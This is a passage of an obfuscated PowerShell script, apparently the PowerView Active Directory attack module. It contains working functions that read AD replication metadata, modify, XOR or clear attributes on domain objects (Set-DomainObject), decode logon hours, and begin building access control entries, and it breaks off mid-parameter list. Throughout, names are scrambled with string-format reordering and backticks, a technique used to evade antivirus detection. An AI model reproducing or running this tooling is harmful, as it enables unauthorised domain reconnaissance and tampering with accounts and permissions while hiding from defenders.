        if (${PSboUNDPA`RAme`T`eRs}[("{0}{1}{2}"-f 'D','oma','in')]) { ${sEA`R`C`herArGumen`Ts}[("{1}{0}" -f 'ain','Dom')] = ${D`oM`AIn} }
        if (${pSb`oUnDPAR`A`ME`Te`Rs}[("{0}{1}{2}" -f 'L','DAPFil','ter')]) { ${SeA`R`ch`er`ARGuMENTS}[("{1}{3}{0}{2}"-f 'lt','LDA','er','PFi')] = ${LdapF`i`L`TeR} }
        if (${PsboUNdpa`RAMe`TE`RS}[("{3}{2}{0}{1}"-f 'rchBas','e','ea','S')]) { ${se`ARc`HEra`R`gUm`Ents}[("{2}{0}{1}" -f'chB','ase','Sear')] = ${SeARC`h`B`ASE} }
        if (${PsBO`U`N`DPA`Ra`MEtERs}[("{0}{1}" -f 'Serv','er')]) { ${SEA`R`C`heR`ArgUME`NTs}[("{0}{1}{2}" -f'Ser','ve','r')] = ${serv`eR} }
        if (${pSb`ou`NDpaRa`m`E`TERs}[("{0}{2}{1}"-f'SearchS','ope','c')]) { ${S`EArC`h`ErARg`Um`enTs}[("{2}{1}{0}"-f 'ope','rchSc','Sea')] = ${sEa`RChs`CO`PE} }
        if (${PSbOUnDp`A`RamEt`E`Rs}[("{0}{3}{1}{2}"-f 'R','tPage','Size','esul')]) { ${s`E`ARcheRArgu`MentS}[("{4}{3}{1}{0}{2}"-f'age','ltP','Size','esu','R')] = ${RESU`ltpA`g`esI`Ze} }
        if (${psbO`UND`Par`AM`EtERS}[("{1}{0}{4}{3}{2}"-f 'meL','ServerTi','t','i','im')]) { ${S`ea`RcH`ErA`R`gUMenTS}[("{4}{2}{0}{3}{1}" -f'imeLim','t','erverT','i','S')] = ${s`erv`e`RtimELim`It} }
        if (${Ps`BOun`DPAram`ETeRS}[("{0}{2}{1}" -f 'Tomb','tone','s')]) { ${s`E`AR`cH`eRaRGUME`NTS}[("{2}{0}{1}{3}"-f'om','bs','T','tone')] = ${tom`B`STOne} }
        if (${pSB`oUnDPAR`Ame`TERs}[("{1}{0}{2}" -f'dO','Fin','ne')]) { ${S`EA`RcHeRaR`GU`m`EnTS}[("{1}{0}"-f 'dOne','Fin')] = ${fI`NdoNe} }
        if (${psbo`UnDPA`RA`MeterS}[("{0}{1}{2}"-f 'C','redentia','l')]) { ${seA`RCH`eRARGUme`NTS}[("{0}{2}{1}"-f'C','al','redenti')] = ${cREd`EN`TI`Al} }

        if (${p`S`BOund`p`AR`AmEtErs}[("{0}{1}{2}" -f'Pr','opertie','s')]) {
            ${PRopE`Rty`Fil`T`eR} = ${PsBOu`N`DPARaMe`T`eRS}[("{2}{1}{0}" -f 'ties','oper','Pr')] -Join '|'
        }
        else {
            ${proP`eR`Ty`FiL`TeR} = ''
        }
    }

    PROCESS {
        if (${PsBOUN`d`P`ARaM`etERS}[("{2}{1}{0}"-f 'ty','i','Ident')]) { ${seARCHera`R`Gume`NtS}[("{1}{0}"-f 'tity','Iden')] = ${I`d`eNtIty} }

        &("{3}{2}{1}{0}" -f'ect','Obj','n','Get-Domai') @SearcherArguments | &("{1}{2}{3}{0}" -f 't','F','o','rEach-Objec') {
            ${oB`je`CtDN} = ${_}."PRoP`eRT`I`Es"[("{0}{2}{1}{3}"-f'dis','inguished','t','name')][0]
            ForEach(${xMLN`OdE} in ${_}."p`ROpeR`T`Ies"[("{3}{1}{5}{0}{2}{4}"-f 'ta','-r','dat','msds','a','eplattributeme')]) {
                ${T`em`PoBJEcT} = [xml]${xM`lno`dE} | &("{3}{0}{1}{2}" -f 'lect-','Obje','ct','Se') -ExpandProperty ("{1}{2}{3}{0}"-f'TR_META_DATA','D','S_RE','PL_AT') -ErrorAction ("{3}{4}{0}{1}{2}" -f'tlyC','onti','nue','S','ilen')
                if (${t`EmPoB`je`Ct}) {
                    if (${TemPobj`E`cT}."PS`ZATtRiB`UtEN`AME" -Match ${propeRtYf`Il`T`Er}) {
                        ${OuT`puT} = &("{3}{0}{2}{1}"-f'ew-Obj','t','ec','N') ("{2}{0}{1}" -f'S','Object','P')
                        ${OUT`pUt} | &("{3}{0}{2}{1}" -f'dd-','mber','Me','A') ("{3}{0}{2}{1}"-f'Prope','ty','r','Note') ("{1}{0}{2}"-f'ct','Obje','DN') ${O`BjE`ctDN}
                        ${OUt`p`Ut} | &("{0}{1}{2}{3}"-f'Ad','d','-','Member') ("{2}{0}{1}" -f 'rope','rty','NoteP') ("{1}{0}{2}"-f'eNam','Attribut','e') ${T`eM`Pob`JecT}."pS`zatT`RiB`UTEnAmE"
                        ${oU`TP`UT} | &("{0}{2}{1}"-f'Add-','ember','M') ("{2}{0}{3}{1}"-f 't','rty','No','ePrope') ("{2}{1}{3}{4}{5}{6}{0}"-f 'e','a','L','s','tOri','ginatingChan','g') ${t`em`POB`Ject}."f`TIMEL`Ast`OrIGIN`ATING`cHAnGe"
                        ${oUt`p`UT} | &("{2}{0}{1}" -f '-Membe','r','Add') ("{2}{1}{0}" -f'erty','Prop','Note') ("{0}{1}{2}" -f'V','er','sion') ${T`EMpoBJ`E`Ct}."DWver`SI`oN"
                        ${o`U`TPuT} | &("{2}{0}{1}" -f'dd-','Member','A') ("{2}{3}{1}{0}" -f 'perty','o','Note','Pr') ("{1}{4}{3}{2}{0}"-f'aDN','La','ingDs','t','stOrigina') ${T`e`m`Pobject}."pS`ZL`ASTo`Rigi`NATIngDSa`DN"
                        ${OU`T`puT}."p`So`BjECt"."TYp`e`NAmes".("{0}{1}" -f'Ins','ert').Invoke(0, ("{4}{5}{6}{0}{7}{3}{2}{1}" -f'.AD','buteHistory','i','ctAttr','Power','V','iew','Obje'))
                        ${O`UtP`UT}
                    }
                }
                else {
                    &("{1}{3}{2}{0}"-f 'ose','Write-','erb','V') ('[Get-'+'DomainObje'+'c'+'tA'+'ttrib'+'uteHis'+'tory]'+' '+'E'+'rror '+'ret'+'r'+'ieving '+(('3E'+'sm'+'sds-'+'re'+'p'+'latt'+'ributemetadata3'+'Es ')-cReplACe  ([cHAR]51+[cHAR]69+[cHAR]115),[cHAR]39)+'for'+' '+"'$ObjectDN'")
                }
            }
        }
    }
}


function GeT-DoMaI`NObjECtlINk`EdA`Ttribut`e`h`isto`RY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{6}{1}{4}{0}{8}{5}{9}{7}{3}{10}"-f 'are','eDe','PSU','me','cl','sMoreThanAss','s','gn','dVar','i','nts'}, '')]
    [OutputType({"{3}{6}{0}{8}{4}{7}{2}{1}{9}{5}"-f'ADO','is','teH','PowerVi','A','ry','ew.','ttribu','bjectLinked','to'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsitiON = 0, VaLUEFRompIPeliNe = ${t`RUE}, valueFRomPiPElInebYpROPErtYNAme = ${T`RUe})]
        [Alias({"{1}{0}{3}{2}{4}"-f'isti','D','guishedN','n','ame'}, {"{3}{0}{4}{2}{1}" -f 'c','e','untNam','SamAc','o'}, {"{0}{1}" -f'N','ame'}, {"{3}{1}{4}{2}{0}{5}" -f'he','emberDis','s','M','tingui','dName'}, {"{1}{3}{2}{0}"-f'ame','M','erN','emb'})]
        [String[]]
        ${idE`Nt`ItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`omaiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'Fi','l','ter'})]
        [String]
        ${L`DA`P`FiLtEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pRo`p`E`RTIES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADSPat','h'})]
        [String]
        ${s`earC`hBAsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{4}{3}" -f 'Co','Doma','in','ller','ntro'})]
        [String]
        ${SEr`V`ER},

        [ValidateSet({"{1}{0}" -f'se','Ba'}, {"{0}{1}" -f'O','neLevel'}, {"{1}{2}{0}" -f'ree','S','ubt'})]
        [String]
        ${S`eaRchSC`oPE} = ("{1}{0}" -f'ubtree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reSulT`p`AGESI`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`e`Rve`Rti`mELiMIt},

        [Switch]
        ${T`o`mBsTOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cre`DEn`TiAL} =   ${JH`3xo6}::"E`MptY",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${seaRCh`ERA`R`Gu`MEN`TS} = @{
            ("{0}{1}{2}" -f'Pr','operti','es')    =   ("{2}{0}{4}{1}{3}"-f'ep','value','msds-r','metadata','l'),("{2}{3}{0}{1}" -f'h','edname','d','istinguis')
            'Raw'           =   ${tr`UE}
        }
        if (${P`sBoUndPara`Me`TErS}[("{1}{0}" -f 'in','Doma')]) { ${SEa`RcHeRaRGU`mE`NtS}[("{0}{1}"-f 'Doma','in')] = ${D`OMA`IN} }
        if (${PsBOUNdp`AR`AMetE`RS}[("{2}{0}{1}" -f 'APFi','lter','LD')]) { ${seArcH`eRar`G`Um`eNts}[("{2}{3}{0}{1}"-f 'AP','Filter','L','D')] = ${L`dap`FIlt`ER} }
        if (${P`Sb`O`UnDPAram`eT`erS}[("{2}{1}{0}" -f'e','Bas','Search')]) { ${S`EArC`H`ErArGuMENTS}[("{1}{2}{0}"-f 'Base','Sea','rch')] = ${sEar`CHBa`sE} }
        if (${ps`BoUnDp`ARaMeTe`RS}[("{1}{2}{0}" -f'r','S','erve')]) { ${sEaRcHerarGu`m`EN`Ts}[("{0}{1}" -f'Serv','er')] = ${SER`V`er} }
        if (${psB`o`UNdPaRAM`etE`RS}[("{2}{0}{3}{1}" -f 'ea','cope','S','rchS')]) { ${s`EA`RCHERarG`UMeN`Ts}[("{3}{2}{1}{0}" -f'cope','hS','earc','S')] = ${Se`AR`CHSCoPE} }
        if (${psboU`NdPa`RA`me`TerS}[("{0}{1}{2}" -f 'Res','ultP','ageSize')]) { ${se`ArChER`A`Rg`UMeN`Ts}[("{2}{1}{0}" -f'e','iz','ResultPageS')] = ${ResuL`Tp`AGEs`I`zE} }
        if (${ps`Bo`UnDpAr`AmEters}[("{3}{1}{2}{0}{4}" -f'i','L','im','ServerTime','t')]) { ${sEA`R`C`herArGUMen`Ts}[("{0}{1}{2}"-f'Ser','verTimeLimi','t')] = ${SerVe`R`TIM`eL`iMIt} }
        if (${p`S`BO`Un`dpA`RaMeters}[("{1}{0}{2}" -f'mbs','To','tone')]) { ${seArC`h`eRARg`U`mEn`Ts}[("{0}{1}{2}"-f'To','mbs','tone')] = ${tomb`sT`oNE} }
        if (${psBoU`NDp`A`R`AMETe`RS}[("{2}{3}{1}{0}"-f'al','ti','Cre','den')]) { ${Se`Arc`HeRa`Rg`UmeNts}[("{1}{2}{0}" -f'l','Credenti','a')] = ${C`ReDe`N`TiAL} }

        if (${pS`B`ou`N`DpArAMEteRs}[("{2}{0}{1}" -f 'tie','s','Proper')]) {
            ${proPER`T`yF`ILt`eR} = ${p`sboU`NdpaRA`MEtE`Rs}[("{2}{0}{1}{3}" -f 'rop','ertie','P','s')] -Join '|'
        }
        else {
            ${pROpERT`YfIL`Ter} = ''
        }
    }

    PROCESS {
        if (${PS`BoU`NdpArA`mETE`RS}[("{0}{1}{2}" -f 'Id','en','tity')]) { ${SeA`Rc`HE`RA`RGume`NTs}[("{0}{1}{2}"-f 'Id','ent','ity')] = ${I`DE`NTiTy} }

        &("{2}{1}{3}{0}"-f'ect','t-Doma','Ge','inObj') @SearcherArguments | &("{1}{0}{2}"-f 'Objec','ForEach-','t') {
            ${obje`c`TdN} = ${_}."Pr`O`PertI`eS"[("{5}{1}{3}{4}{0}{2}"-f'ishedn','i','ame','n','gu','dist')][0]
            ForEach(${XmlN`O`dE} in ${_}."pRoP`Ert`ies"[("{1}{2}{0}{5}{4}{3}"-f 'ds-re','m','s','etadata','luem','plva')]) {
                ${t`Em`pO`BJeCt} = [xml]${x`Ml`NoDE} | &("{2}{3}{1}{0}" -f't','ec','Selec','t-Obj') -ExpandProperty ("{2}{4}{3}{0}{5}{1}"-f'T','TA','D','E','S_REPL_VALUE_M','A_DA') -ErrorAction ("{3}{2}{1}{0}" -f 'ue','n','lentlyConti','Si')
                if (${TeMP`obj`eCt}) {
                    if (${tEm`POBje`ct}."PsZAttr`I`But`ENA`mE" -Match ${Prop`ERt`y`FiLTEr}) {
                        ${OU`T`PuT} = &("{2}{1}{0}"-f 'bject','ew-O','N') ("{0}{1}{2}"-f 'PS','Objec','t')
                        ${out`put} | &("{2}{1}{0}"-f 'r','dd-Membe','A') ("{0}{2}{3}{1}" -f'No','ty','tePrope','r') ("{0}{1}{2}"-f'Obje','ct','DN') ${OBje`CtdN}
                        ${O`U`TpuT} | &("{0}{2}{1}" -f 'Add-M','ber','em') ("{2}{1}{0}"-f 'y','otePropert','N') ("{1}{3}{0}{2}{4}"-f 'ibuteN','A','a','ttr','me') ${tempO`BJe`Ct}."PsZ`A`TTR`ibuT`enA`me"
                        ${outp`Ut} | &("{1}{2}{0}"-f 'ember','Add','-M') ("{3}{1}{2}{0}" -f'rty','o','pe','NotePr') ("{4}{0}{2}{1}{3}" -f 'ttributeV','lu','a','e','A') ${T`EM`Pobj`Ect}."PS`zoBJeC`Tdn"
                        ${o`UTp`Ut} | &("{3}{2}{1}{0}" -f 'ember','M','d-','Ad') ("{2}{3}{1}{0}"-f'Property','e','N','ot') ("{0}{2}{1}"-f'T','eCreated','im') ${TEm`Pobj`eCT}."fT`IM`Ec`REaTEd"
                        ${oUTp`Ut} | &("{2}{1}{3}{0}" -f 'er','dd-Mem','A','b') ("{1}{0}{2}{3}"-f 'e','Not','Propert','y') ("{0}{1}{2}{3}"-f'Ti','meDele','te','d') ${t`E`mpob`jECT}."fTiMede`L`E`TED"
                        ${o`UtPut} | &("{2}{0}{1}"-f'b','er','Add-Mem') ("{3}{2}{0}{1}"-f 'teProp','erty','o','N') ("{1}{3}{2}{0}{4}"-f'atin','L','igin','astOr','gChange') ${teM`po`BJECt}."FTiMeLastoRi`GinAtI`N`gch`AN`ge"
                        ${O`UtPut} | &("{1}{2}{0}"-f 'r','Ad','d-Membe') ("{2}{3}{1}{0}"-f 'y','opert','NoteP','r') ("{2}{0}{1}"-f 'i','on','Vers') ${Te`mP`OBJ`ect}."d`wvErSi`On"
                        ${oUtP`UT} | &("{1}{2}{0}" -f'er','Add-Me','mb') ("{0}{2}{1}" -f'NoteP','perty','ro') ("{2}{4}{1}{3}{0}"-f 'DsaDN','Originati','L','ng','ast') ${tEMpOBj`E`ct}."PSZlAS`TorIg`i`NATin`g`dsAdN"
                        ${ouT`p`Ut}."pS`oBj`ECT"."t`Y`PeNaMeS".("{1}{0}" -f't','Inser').Invoke(0, ("{9}{5}{0}{8}{4}{6}{1}{3}{7}{2}"-f 'iew.','k','uteHistory','edAtt','ect','V','Lin','rib','ADObj','Power'))
                        ${OU`TP`UT}
                    }
                }
                else {
                    &("{1}{3}{0}{2}" -f'e-V','Wri','erbose','t') ('[Get-DomainObj'+'e'+'c'+'tLin'+'ke'+'d'+'Attribute'+'Hist'+'o'+'r'+'y'+'] '+'Erro'+'r '+'retr'+'ie'+'ving '+('{0'+'}msds-r'+'e'+'p'+'lv'+'aluemetada'+'ta{'+'0} ')  -F [chaR]39+'fo'+'r '+"'$ObjectDN'")
                }
            }
        }
    }
}


function seT-dO`mA`INO`BJeCT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{4}{6}{0}{1}{2}{7}{3}" -f 'h','ang','ingFuncti','ns','seShouldProcessForStat','PSU','eC','o'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{1}{4}" -f 'PSSho','c','o','uldPr','ess'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POSITiON = 0, MaNDatoRy = ${Tr`Ue}, valUeFROmPIpeline = ${T`RUe}, vaLuEfrOMpIPEliNEByprOPertyName = ${t`RUe})]
        [Alias({"{2}{3}{0}{1}"-f'guishedNam','e','Dist','in'}, {"{0}{1}{2}{3}"-f'Sa','m','Acco','untName'}, {"{1}{0}"-f'me','Na'})]
        [String[]]
        ${I`dENt`ItY},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f 'Rep','l','ace'})]
        [Hashtable]
        ${S`Et},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${X`Or},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CL`EaR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oMA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'r','ilte','F'})]
        [String]
        ${LD`A`pfil`Ter},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f'S','Path','AD'})]
        [String]
        ${SEA`Rchb`ASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{1}{3}{2}{0}"-f'r','ai','lle','nContro','Dom'})]
        [String]
        ${Se`RVEr},

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{1}{0}{2}"-f'n','O','eLevel'}, {"{1}{0}" -f 'ee','Subtr'})]
        [String]
        ${S`earch`scOPE} = ("{0}{1}{2}" -f'S','ubtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RESu`lt`PAges`iZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`Rv`erTiMe`limIT},

        [Switch]
        ${TOMBST`O`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`eDe`NTial} =   (  &('LS')  ('VA'+'ri'+'Abl'+'E'+':Jh3xO6'))."V`AlUE"::"em`PTy"
    )

    BEGIN {
        ${SeAr`CH`ErArG`UMeNTS} = @{'Raw' = ${t`Rue}}
        if (${p`sboUN`Dp`A`Rame`TERs}[("{2}{0}{1}" -f'm','ain','Do')]) { ${S`eARCHE`R`AR`gU`meNts}[("{1}{0}{2}" -f'ma','Do','in')] = ${dO`M`AiN} }
        if (${p`sBoUndp`A`RAME`TERs}[("{1}{0}{2}" -f 'APFilt','LD','er')]) { ${sEaRCh`eRarGu`M`en`TS}[("{1}{2}{0}"-f 'r','LD','APFilte')] = ${ldA`PFIl`T`Er} }
        if (${p`s`BO`UNd`PARAmeTErS}[("{2}{1}{0}"-f 'se','earchBa','S')]) { ${s`earchERa`R`gU`M`EnTs}[("{1}{2}{3}{0}"-f'e','Searc','hB','as')] = ${S`E`ArcHbAsE} }
        if (${pS`BoUNDP`ARaM`ETers}[("{0}{1}" -f 'Ser','ver')]) { ${S`eARCH`Er`ARgum`ents}[("{2}{1}{0}" -f'r','ve','Ser')] = ${S`eRVEr} }
        if (${psBOuNd`P`A`RAme`TeRS}[("{1}{2}{0}{3}" -f 'Scop','S','earch','e')]) { ${seAR`Che`RargUM`eN`TS}[("{2}{0}{1}"-f'r','chScope','Sea')] = ${SeaR`chSC`o`pE} }
        if (${p`sb`OunD`PARAmE`TE`Rs}[("{3}{4}{0}{1}{2}"-f 'i','z','e','ResultPa','geS')]) { ${S`eARChE`Ra`RGu`Ments}[("{3}{0}{1}{4}{2}" -f 'ltP','a','ize','Resu','geS')] = ${ReSU`lT`pa`gesize} }
        if (${PSB`oUNd`pAra`meteRS}[("{1}{0}{3}{4}{2}"-f'erver','S','Limit','Tim','e')]) { ${S`e`AR`ChEra`Rgu`meNtS}[("{1}{2}{3}{0}" -f 'Limit','S','e','rverTime')] = ${se`Rve`Rti`m`eLImIt} }
        if (${Psbo`U`Ndp`ArAMeteRS}[("{2}{1}{0}" -f 'one','ombst','T')]) { ${sE`ArcHER`A`RG`UMentS}[("{0}{2}{1}"-f'To','stone','mb')] = ${tO`mbSTo`Ne} }
        if (${p`sboun`DpAr`AMeTErs}[("{2}{1}{0}" -f'ial','edent','Cr')]) { ${seaR`CHeRa`RGu`ME`N`Ts}[("{0}{1}{2}"-f'Cre','d','ential')] = ${crEDeNT`I`AL} }
    }

    PROCESS {
        if (${P`s`BouNDPa`RaM`EtErs}[("{0}{1}" -f'Identi','ty')]) { ${s`eaRche`Ra`Rg`Umen`Ts}[("{0}{1}"-f'Id','entity')] = ${IdeNT`I`Ty} }

        
        ${R`A`Wob`JECT} = &("{1}{3}{0}{2}" -f '-Domain','Ge','Object','t') @SearcherArguments

        ForEach (${obJ`E`ct} in ${Rawo`B`JEcT}) {

            ${e`NTry} = ${r`Aw`objecT}.("{0}{2}{1}{3}" -f 'GetDir','ory','ect','Entry').Invoke()

            if(${p`sBOun`dPARamE`TERS}['Set']) {
                try {
                    ${pSB`o`UndpAR`A`Met`eRs}['Set'].("{3}{0}{1}{2}" -f'at','o','r','GetEnumer').Invoke() | &("{4}{2}{1}{3}{0}"-f'ect','ach-O','rE','bj','Fo') {
                        &("{0}{1}{3}{2}" -f 'Writ','e-Ve','se','rbo') "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)' "
                        ${eNt`Ry}.("{0}{1}"-f'pu','t').Invoke(${_}."nA`mE", ${_}."VaL`UE")
                    }
                    ${eN`Try}.("{1}{3}{2}{0}"-f 'anges','c','mitch','om').Invoke()
                }
                catch {
                    &("{4}{3}{1}{0}{2}" -f 'n','ni','g','War','Write-') "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if(${PSbO`UNDP`ARA`meTeRs}['XOR']) {
                try {
                    ${p`s`BOUnd`PaRAM`eT`eRs}['XOR'].("{1}{2}{0}{3}" -f'e','Get','Enum','rator').Invoke() | &("{3}{0}{1}{2}"-f '-O','b','ject','ForEach') {
                        ${p`RopE`R`T`YNaME} = ${_}."na`mE"
                        ${p`R`OpE`RTyXorV`ALUE} = ${_}."v`AlUe"
                        &("{3}{2}{0}{1}"-f'erbos','e','e-V','Writ') "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)' "
                        ${t`yP`enaME} = ${En`Try}.${Pr`OpErt`yna`Me}[0].("{1}{0}" -f 'ype','GetT').Invoke()."nA`mE"

                        
                        ${Pr`OpeR`TyVa`l`Ue} = $(${EnT`RY}.${PR`o`P`erTYNaME}) -bxor ${pRope`R`TyxOrvA`lue}
                        ${E`NTry}.${pRo`peRtyn`A`me} = ${PRo`pEr`T`Yv`AlUE} -as ${t`yPename}
                    }
                    ${e`NTRy}.("{2}{1}{0}" -f 'nges','mmitcha','co').Invoke()
                }
                catch {
                    &("{3}{2}{0}{1}" -f'rn','ing','Wa','Write-') "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if(${pS`Bou`NDpaR`AME`TERS}[("{1}{0}"-f 'r','Clea')]) {
                try {
                    ${pS`B`oUNdpAr`AmE`TErS}[("{0}{1}" -f'C','lear')] | &("{1}{0}{2}"-f 'bjec','ForEach-O','t') {
                        ${Pr`OP`eR`TYnAME} = ${_}
                        &("{0}{3}{2}{1}"-f'Write-V','se','bo','er') "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)' "
                        ${e`N`Try}.${p`R`oPeR`Ty`NAme}.("{1}{0}" -f'r','clea').Invoke()
                    }
                    ${En`Try}.("{0}{2}{1}" -f'commitcha','es','ng').Invoke()
                }
                catch {
                    &("{1}{0}{2}" -f 'te-','Wri','Warning') "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
        }
    }
}


function ConV`e`RTfrOM`-LDapl`ogonhOURS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{6}{7}{10}{1}{9}{3}{0}{2}{8}{5}{4}" -f 'anA','aredVarsMo','ssi','Th','s','t','PSUse','D','gnmen','re','ecl'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{2}{1}"-f'Sh','ess','ouldProc','PS'}, '')]
    [OutputType({"{3}{1}{2}{0}" -f's','View.Logon','Hour','Power'})]
    [CmdletBinding()]
    Param (
        [Parameter( vaLUEfrOMpipeLINe = ${t`RUe}, vALUEfRompIPELINEBYPRoPeRTynAMe = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        ${L`o`g`ONh`ouRSArraY}
    )

    Begin {
        if(${l`oG`O`NH`our`SarrAy}."C`OUNt" -ne 21) {
            throw ("{8}{11}{0}{7}{5}{2}{10}{1}{3}{9}{4}{6}"-f 'ours','e in',' ','co',' leng','ray','th','Ar','Logo','rrect','is th','nH')
        }

        function CoNveRt`TO-`lOG`onHOURS`ArrAy {
            Param (
                [int[]]
                ${hOUr`S`ArR}
            )

            ${lo`gOn`ho`UrS} = &("{0}{1}{2}"-f'New-Ob','je','ct') ("{0}{1}" -f 'boo','l[]') 24
            for(${i}=0; ${i} -lt 3; ${I}++) {
                ${B`ytE} = ${ho`Ur`sarr}[${i}]
                ${OFfS`et} = ${i} * 8
                ${S`TR} =  ${itA`7L}::("{1}{2}{0}" -f'g','ToS','trin').Invoke(${BY`TE},2).("{2}{1}{0}"-f 't','dLef','Pa').Invoke(8,'0')

                ${lo`GONHo`U`RS}[${O`FF`sET}+0] = [bool]   ${I`Ta`7l}::"TOint`32"([string]${s`TR}[7])
                ${L`OGO`N`hOurS}[${of`Fset}+1] = [bool]   ( &("{2}{0}{1}" -f'iabL','e','gET-VAR') ('i'+'tA7l')  )."Val`UE"::"T`OINT32"([string]${S`Tr}[6])
                ${L`OgON`Hours}[${O`Ffs`ET}+2] = [bool]   ${ita`7l}::"T`oi`Nt32"([string]${S`Tr}[5])
                ${LO`GO`NhOURS}[${o`FFSEt}+3] = [bool]  ${it`A7L}::"to`IN`T32"([string]${S`Tr}[4])
                ${log`oNHOU`Rs}[${o`FF`set}+4] = [bool]  (  &('gi') ("{0}{3}{1}{2}"-f'V','Able:ita','7l','ArI')  )."Va`LUe"::"TOiNt`32"([string]${s`Tr}[3])
                ${l`oG`oNh`oUrS}[${OFFS`eT}+5] = [bool]   ${It`A7L}::"T`oi`NT32"([string]${s`TR}[2])
                ${LoGo`Nh`OuRs}[${O`FfseT}+6] = [bool]   ${It`A`7L}::"T`o`INT32"([string]${S`Tr}[1])
                ${l`ogonHo`Urs}[${o`FfS`et}+7] = [bool]   ${i`Ta7L}::"To`iN`T32"([string]${S`Tr}[0])
            }

            ${lOGo`N`H`ouRS}
        }
    }

    Process {
        ${Ou`T`pUT} = @{
            ("{2}{1}{0}"-f 'y','unda','S') = &("{5}{4}{2}{0}{6}{3}{1}"-f 'ou','y','onH','rra','Log','ConvertTo-','rsA') -HoursArr ${loGOnhOU`RSa`R`RaY}[0..2]
            ("{0}{1}"-f'Mond','ay') = &("{7}{3}{5}{2}{1}{6}{4}{0}" -f'ursArray','gon','Lo','ert','o','To-','H','Conv') -HoursArr ${lO`Go`NHoU`RSArRAy}[3..5]
            ("{0}{1}"-f 'Tues','day') = &("{4}{5}{2}{3}{1}{7}{6}{0}"-f 'ay','Hours','-','Logon','Conv','ertTo','rr','A') -HoursArr ${L`Ogo`NhOuR`s`ArRAY}[6..8]
            ("{0}{2}{1}"-f 'We','y','dnesda') = &("{2}{4}{1}{0}{3}" -f'HoursAr','gon','ConvertTo-','ray','Lo') -HoursArr ${LoGonh`OU`R`SA`RrAy}[9..11]
            ("{0}{1}" -f'T','hurs') = &("{4}{3}{0}{2}{1}"-f'-Log','ray','onHoursAr','onvertTo','C') -HoursArr ${loGON`Hour`sa`R`RAY}[12..14]
            ("{1}{0}" -f 'iday','Fr') = &("{2}{5}{0}{4}{3}{1}"-f'H','ray','C','rsAr','ou','onvertTo-Logon') -HoursArr ${logO`NHoU`RS`ArRAY}[15..17]
            ("{0}{2}{1}"-f'Sat','day','ur') = &("{2}{0}{3}{6}{5}{4}{1}"-f've','ay','Con','rtTo-Logo','sArr','ur','nHo') -HoursArr ${lOGoNho`U`Rsa`RRAy}[18..20]
        }

        ${o`UtpUT} = &("{1}{2}{0}{3}"-f 'bje','Ne','w-O','ct') ("{1}{2}{0}" -f 'ect','PSO','bj') -Property ${o`U`TPuT}
        ${OuTP`UT}."ps`Ob`JECT"."tyPE`N`Am`Es".("{0}{1}" -f 'Inse','rt').Invoke(0, ("{0}{3}{1}{4}{2}" -f 'P','ew.Logo','urs','owerVi','nHo'))
        ${out`PuT}
    }
}


function Ne`W-adoB`jEc`TacCEs`ScOnTR`oLenTRY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{11}{4}{7}{10}{1}{8}{3}{6}{0}{2}{5}{12}{9}"-f 'ingF','ssFo','un','a','Use','cti','ng','ShouldP','rStateCh','s','roce','PS','on'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{2}{1}" -f 'oul','ocess','dPr','PSSh'}, '')]
    [OutputType({"{13}{7}{12}{4}{8}{1}{3}{11}{0}{9}{6}{5}{10}{2}" -f 'o','Con','e','trol.Aut','y.Acces','ti','a','te','s','riz','onRul','h','m.Securit','Sys'})]
    [CmdletBinding()]
    Param (
        [Parameter(posITioN = 0, vAluEFroMPIpEliNe = ${tR`UE}, VAlUEfrOmpIpELINEbyProPertynAMe = ${t`RUe}, MAndaTory = ${t`Rue})]
        [Alias({"{2}{3}{1}{0}" -f'Name','ished','Disting','u'}, {"{0}{4}{2}{1}{3}" -f'SamAccoun','a','N','me','t'}, {"{0}{1}"-f'Na','me'})]
        [String]
        ${prIN`Cip`A`LI`DenT`itY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${pRin`c`iP`ALdoma`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{1}"-f'n','ontroller','Domai','C'})]
        [String]
        ${SER`V`er},

